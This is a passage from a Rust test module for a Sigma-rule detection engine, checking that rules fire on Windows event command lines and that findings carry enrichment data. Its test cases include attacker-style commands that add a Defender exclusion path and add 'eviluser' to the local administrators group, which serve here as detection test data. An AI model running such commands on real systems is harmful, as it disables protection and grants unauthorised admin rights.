            ("defender-exclusion", "powershell Add-MpPreference -ExclusionPath C:\\temp"),
            ("net-localgroup-admin", "net localgroup administrators eviluser /add"),
        ];
        for (frag, cmdline) in cases {
            let e = ev(
                "Microsoft-Windows-Sysmon/Operational",
                "1",
                serde_json::json!({ "CommandLine": cmdline }),
            );
            let findings = evaluate("c1", &rs, std::slice::from_ref(&e));
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id.as_deref().is_some_and(|r| r.contains(frag))),
                "rule '{frag}' did not fire for: {cmdline}"
            );
        }
    }

    #[test]
    fn finding_carries_enrichment_and_entities() {
        let json = r#"[{
            "id":"r","title":"R","level":"high",
            "description":"why it fires",
            "references":["https://example/ref"],
            "falsepositives":["benign case"],
            "tags":["attack.t1059.001","attack.execution"],
            "logsource":{"service":"security"},
            "detection":{"selection":{"CommandLine|contains":"needle"},"condition":"selection"}
        }]"#;
        let rs = SigmaRuleSet::from_json(json);
        assert_eq!(rs.len(), 1);
        let e = ev("Security", "4688", serde_json::json!({"CommandLine": "needle here"}));
        let f = evaluate("c1", &rs, std::slice::from_ref(&e));
        assert_eq!(f.len(), 1);
        let enr: Value = serde_json::from_str(&f[0].enrichment_json).unwrap();
        assert_eq!(enr["description"], "why it fires");
        assert_eq!(enr["references"][0], "https://example/ref");
        assert_eq!(enr["falsepositives"][0], "benign case");
        assert_eq!(enr["tactics"][0], "execution");
        assert_eq!(enr["rule_level"], "high");
        assert!(enr["matched"].is_object());
        let ents: Vec<String> = serde_json::from_str(&f[0].entity_ids_json).unwrap();
        assert!(ents.iter().any(|x| x == "host:HOST1"), "entities={ents:?}");
    }
}
